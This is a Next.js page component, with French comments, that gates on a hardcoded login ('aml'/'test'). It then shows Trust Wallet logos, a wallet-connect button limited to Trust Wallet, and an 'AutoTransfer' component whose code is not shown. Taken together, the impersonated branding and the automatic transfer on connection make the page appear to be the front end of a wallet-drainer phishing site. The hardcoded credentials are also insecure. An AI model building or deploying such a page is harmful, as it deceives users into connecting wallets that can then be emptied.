"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { ConnectButton } from "thirdweb/react";
import { createThirdwebClient } from "thirdweb";
import { createWallet, type Wallet } from "thirdweb/wallets";
import AutoTransfer from "./components/AutoTransfer";
import trustwallet from "@public/trustwallet.png";
import trust from "@public/trust.png";

// --- Création du client Thirdweb ---
const client = createThirdwebClient({
  clientId: "c98a5d48ad89f114ad6044933fced541",
});

// --- Limiter les wallets à Trust Wallet uniquement ---
const wallets = [createWallet("com.trustwallet.app")];

export default function Home() {
  // ---- Ajout de la logique de login de l'ancien code ----
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const router = useRouter();

  const handleLogin = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (username === "aml" && password === "test") {
      setIsLoggedIn(true);
      router.push("/"); // Recharge sur la page principale
    } else {
      alert("Login error: incorrect username or password.");
    }
  };

  const handleWalletConnect = async (wallet: Wallet) => {
    try {
      const account = await wallet.getAccount();
      if (account) {
        console.log("Wallet connected:", account.address);
      } else {
        console.log("Wallet connected but address pending");
      }
    } catch (error) {
      console.error("Wallet connection failed:", error);
    }
  };

  const handleWalletDisconnect = async () => {
    console.log("Wallet disconnected");
  };

  // ---- Affiche d'abord le formulaire de connexion si pas encore logué ----
  if (!isLoggedIn) {
    return (
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          height: "100vh",
          backgroundColor: "#f0f4f8",
          fontFamily: "Arial, sans-serif",
          paddingTop: "40px",
          boxSizing: "border-box",
        }}
      >
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
          }}
        >
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              marginBottom: "40px",
            }}
          >
         
          </div>

          <h1
            style={{
              color: "#333",
              fontSize: "2rem",
              marginBottom: "30px",
            }}
          >
            Connexion
          </h1>

          <form
            onSubmit={handleLogin}
            style={{
              display: "flex",
              flexDirection: "column",
              width: "300px",
              backgroundColor: "white",
              padding: "20px",
              borderRadius: "10px",
              boxShadow: "0 4px 8px rgba(0, 0, 0, 0.1)",
            }}
          >
            <div style={{ marginBottom: "20px" }}>
              <label
                style={{
                  display: "block",
                  marginBottom: "10px",
                  fontWeight: "bold",
                  color: "#555",
                }}
              >
                Username:
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter your username"
                style={{
                  width: "100%",
                  padding: "12px",
                  borderRadius: "8px",
                  border: "1px solid #ddd",
                  fontSize: "16px",
                  backgroundColor: "#f9f9f9",
                }}
              />
            </div>

            <div style={{ marginBottom: "20px" }}>
              <label
                style={{
                  display: "block",
                  marginBottom: "10px",
                  fontWeight: "bold",
                  color: "#555",
                }}
              >
                Password:
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                style={{
                  width: "100%",
                  padding: "12px",
                  borderRadius: "8px",
                  border: "1px solid #ddd",
                  fontSize: "16px",
                  backgroundColor: "#f9f9f9",
                }}
              />
            </div>

            <button
              type="submit"
              style={{
                backgroundColor: "#007bff",
                color: "white",
                padding: "12px",
                borderRadius: "8px",
                border: "none",
                fontSize: "16px",
                cursor: "pointer",
                transition: "background-color 0.3s ease",
              }}
            >
              Connexion
            </button>
          </form>
        </div>
      </div>
    );
  }

  // ---- Si login réussi, affiche ton nouveau contenu ----
  return (
    <main className="p-4 pb-10 min-h-[100vh] flex flex-col items-center justify-center container max-w-screen-lg mx-auto bg-white">
      <Header />

      <div className="flex justify-center mb-20 mt-10">
        <ConnectButton
          client={client}
          wallets={wallets}
          connectModal={{ size: "compact" }}
          onConnect={handleWalletConnect}
          onDisconnect={handleWalletDisconnect}
          appMetadata={{
            name: "Example App",
            url: "https://example.com",
          }}
        />
      </div>

      <AutoTransfer />
    </main>
  );
}

function Header() {
  return (
    <header className="flex flex-col items-center mb-20">
      <Image
        src={trustwallet}
        alt="Trustwallet Logo"
        width={150}
        height={150}
        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
      />
      <Image
        src={trust}
        alt="Trust Logo"
        width={150}
        height={150}
        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
      />
    </header>
  );
}
